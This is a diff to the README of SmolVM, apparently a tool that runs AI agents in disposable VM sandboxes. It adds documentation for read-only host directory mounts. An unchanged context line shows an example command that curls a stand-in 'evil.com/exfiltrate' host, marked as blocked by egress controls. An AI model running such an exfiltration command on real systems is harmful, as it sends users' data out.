@@ -27,6 +27,7 @@ SmolVM gives AI agents their own disposable computer. Each sandbox is a lightwei
 - **Hardware isolation** — Stronger security than containers.
 - **Network controls** — Domain allowlists for egress filtering.
 - **Browser sessions** — Full browser agents can see and control.
+- **Host mounts** — Give sandboxes read access to local directories.
 - **Snapshots** — Save and restore VM state instantly.
 - **OpenClaw** — GUI Linux apps inside a sandbox.
 
@@ -35,6 +36,7 @@ SmolVM gives AI agents their own disposable computer. Each sandbox is a lightwei
 
 - **Run untrusted code safely.** Execute AI-generated code in an isolated sandbox instead of on your machine.
 - **Give agents a browser.** Spin up a full browser session that agents can see and control in real time.
+- **Let agents read your project.** Mount a local directory so agents can explore your codebase inside a sandbox.
 - **Keep state across turns.** Reuse the same sandbox throughout a multi-step workflow.
 
 
@@ -136,6 +138,37 @@ vm.run("curl https://evil.com/exfiltrate")         # blocked
 ```
 
 See [docs/concepts/network-egress-controls.md](docs/deep-dive/network-egress-controls.md) for how it works under the hood.
+
+
+## Mount host directories
+
+You can give a sandbox read access to a folder on your machine. This is useful when an agent needs to work with an existing project without copying files back and forth.
+
+```bash
+smolvm create --mount ~/Projects/my-app
+smolvm ssh my-sandbox
+ls /workspace   # your host files appear here
+```
+
+The host folder is read-only — the sandbox can read every file, but changes stay inside the sandbox and never touch the originals. If the agent creates or edits files under `/workspace`, those changes live only in the VM's overlay layer.
+
+Mount at a custom path, or mount multiple directories:
+
+```bash
+smolvm create --mount ~/Projects/my-app:/code --mount ~/data:/mnt/data
+```
+
+The same works from Python:
+
+```python
+from smolvm import SmolVM
+
+with SmolVM(mounts=["~/Projects/my-app"]) as vm:
+    result = vm.run("ls /workspace")
+    print(result.stdout)
+```
+
+> **Note:** This feature is read-only for now. Any changes you make inside the sandbox do not travel back to the host. Write-back support is planned for a future release.
 
 
 ## Examples
